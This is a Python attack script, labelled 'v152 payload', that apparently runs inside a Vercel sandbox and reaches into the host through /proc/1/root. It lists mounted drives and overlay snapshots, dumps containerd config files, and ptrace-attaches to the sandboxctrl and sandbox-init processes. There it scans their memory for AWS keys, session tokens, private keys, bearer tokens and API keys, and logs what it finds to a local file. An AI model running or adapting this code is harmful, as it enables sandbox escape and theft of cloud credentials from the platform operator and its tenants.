# -*- coding: utf-8 -*-
"""v152 payload: /mnt/drives 枚举(多租户?) + sandboxctrl config 全文 + AWS 凭证定向扫描
输出 /vercel/sandbox/v152c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v152c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def readp(pid, name, n=8000):
    try:
        return open('/proc/%d/%s' % (pid, name), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


def find_procs(comm):
    out = []
    try:
        for d in os.listdir('/proc'):
            if d.isdigit():
                try:
                    if open('/proc/%s/comm' % d).read().strip() == comm:
                        out.append(int(d))
                except Exception:
                    pass
    except Exception:
        pass
    return out


def walk_dir(base, depth=0, max_items=40):
    """安全递归列目录, 返回 (dirs, files)"""
    dirs, files = [], []
    try:
        for e in sorted(os.listdir(base))[:max_items]:
            fp = base + '/' + e
            try:
                st = os.stat(fp)
                if st.st_mode & 0o170000 == 0o040000:
                    dirs.append(e)
                elif st.st_mode & 0o170000 == 0o140000:
                    files.append(e + ' [SOCK]')
                else:
                    files.append('%s (%d)' % (e, st.st_size))
            except Exception:
                files.append(e + ' [?]')
    except Exception as e:
        return None, 'EXC %s' % e
    return dirs, files


def mem_scan(pid, kws, tag='', max_bytes=40 * 1024 * 1024, max_found=20, ctx=220):
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, pid, 0, 0)
        log('%s PTRACE_ATTACH rc=%d errno=%d' % (tag, r, ctypes.get_errno()))
        if r != 0:
            return
        try:
            os.waitpid(pid, os.WUNTRACED)
        except Exception:
            pass
        try:
            maps = open('/proc/%d/maps' % pid).read()
        except Exception:
            maps = ''
        targets = []
        for ln in maps.splitlines():
            parts = ln.split()
            if len(parts) < 2:
                continue
            a, b = parts[0].split('-')
            base = int(a, 16)
            size = int(b, 16) - base
            perm = parts[1]
            if perm[0] != 'r' or size < 4096:
                continue
            if base >= 0xc000000000 or (perm[1] == 'w' and size < 100 * 1024 * 1024):
                targets.append((base, size, perm))
        log('%s heap regions=%d' % (tag, len(targets)))
        total = 0
        found = 0
        for base, size, perm in targets:
            if total >= max_bytes or found >= max_found:
                break
            want = min(size, max_bytes - total)
            try:
                mf = open('/proc/%d/mem' % pid, 'rb')
                mf.seek(base)
                chunk = mf.read(want)
                mf.close()
                total += len(chunk)
                for kw in kws:
                    if found >= max_found:
                        break
                    for m in re.finditer(kw, chunk):
                        s = max(0, m.start() - ctx)
                        seg = chunk[s:m.end() + ctx]
                        printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
                        if printable * 10 < len(seg) * 3:
                            continue
                        log('%s MEM %s @0x%x: %r' % (tag, kw, base + m.start(), seg))
                        found += 1
                        if found >= max_found:
                            break
            except Exception as e:
                log('%s mem EXC %s' % (tag, e))
        log('%s heap scan done bytes=%d found=%d' % (tag, total, found))
        try:
            libc.ptrace(17, pid, 0, 0)
        except Exception:
            pass
    except Exception as e:
        log('%s ptrace EXC %s' % (tag, e))


# ============ 1: /mnt/drives 枚举 ============
log('=== 1 /mnt/drives ===')
for base in [R + '/mnt', R + '/mnt/drives']:
    dirs, files = walk_dir(base)
    log('LS %s dirs=%s' % (base, dirs))
    log('LS %s files=%s' % (base, files))
if os.path.exists(R + '/mnt/drives/sandbox'):
    dirs, files = walk_dir(R + '/mnt/drives/sandbox', max_items=60)
    log('DRIVE top dirs=%s' % dirs)
    log('DRIVE top files=%s' % files)
    # 看 drive 根上的敏感目录
    for d in ['etc', 'var', 'opt', 'run', 'root', 'home', 'vercel', 'data']:
        p = R + '/mnt/drives/sandbox/' + d
        d2, f2 = walk_dir(p, max_items=25)
        log('DRIVE /%s dirs=%s files=%s' % (d, d2, f2))

# ============ 2: sandboxctrl 完整 config.json ============
log('=== 2 sc config ===')
try:
    base = R + '/run/containerd/io.containerd.runtime.v2.task/default'
    for cid in sorted(os.listdir(base))[:10]:
        fp = base + '/' + cid + '/config.json'
        try:
            data = open(fp, 'rb').read(30000)
            log('CONFIG %s len=%d: %r' % (cid, len(data), data[:2500]))
            # 提取关键段
            for kw in [b'rootfs', b'seccomp', b'hostname', b'network', b'namespaces', b'gpu',
                       b'cgroup', b'devices', b'readonly', b'bind', b'vsock', b'resource']:
                for m in re.finditer(re.escape(kw), data):
                    s = max(0, m.start() - 100)
                    seg = data[s:m.end() + 300]
                    if len(seg) > 0 and sum(1 for c in seg if 32 <= c < 127) * 10 > len(seg) * 6:
                        log('  CFG %s: %r' % (kw, seg))
                    break  # 每个 kw 只打一个
        except Exception as e:
            log('config EXC %s' % e)
except Exception as e:
    log('task EXC %s' % e)

# ============ 3: overlay snapshot 链 ============
log('=== 3 snapshots ===')
try:
    sb = R + '/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots'
    for e in sorted(os.listdir(sb))[:30]:
        p = sb + '/' + e
        try:
            st = os.stat(p)
            if st.st_mode & 0o170000 == 0o040000:
                sub = sorted(os.listdir(p))
                log('SNAP %s/ = %s' % (e, sub))
            else:
                log('SNAP %s (%d)' % (e, st.st_size))
        except Exception:
            pass
except Exception as e:
    log('snap EXC %s' % e)

# ============ 4: sandboxctrl AWS 凭证定向扫描 ============
log('=== 4 sc creds ===')
pids = find_procs('sandboxctrl')
if pids:
    mem_scan(pids[0],
             [rb'AKIA[0-9A-Z]{16}', rb'ASIA[0-9A-Z]{16}', rb'x-amz-security-token',
              rb'x-amz-credential', rb'-----BEGIN [A-Z ]*PRIVATE KEY-----', rb'aws_secret',
              rb'aws_access_key', rb'Bearer eyJ', rb'api[_ -]?key', rb'DATADOG[_A-Z]*KEY',
              rb'Authorization:\s*[A-Za-z0-9_\-\.]+'],
             tag='sc', max_bytes=64 * 1024 * 1024, max_found=25, ctx=220)

# ============ 5: sandbox-init AWS 凭证定向扫描 ============
log('=== 5 init creds ===')
try:
    init_pid = None
    for d in sorted(os.listdir(R + '/run/cell/runc')):
        try:
            init_pid = int(open(R + '/run/cell/runc/%s/container.pid' % d).read().strip())
        except Exception:
            pass
    if init_pid:
        mem_scan(init_pid,
                 [rb'AKIA[0-9A-Z]{16}', rb'ASIA[0-9A-Z]{16}', rb'x-amz-security-token',
                  rb'-----BEGIN [A-Z ]*PRIVATE KEY-----', rb'aws_secret', rb'aws_access_key',
                  rb'Bearer eyJ', rb'Authorization:\s*[A-Za-z0-9_\-\.]+'],
                 tag='init', max_bytes=64 * 1024 * 1024, max_found=25, ctx=220)
    else:
        log('no init pid')
except Exception as e:
    log('init heap EXC %s' % e)

log('V152_DONE')
f.close()
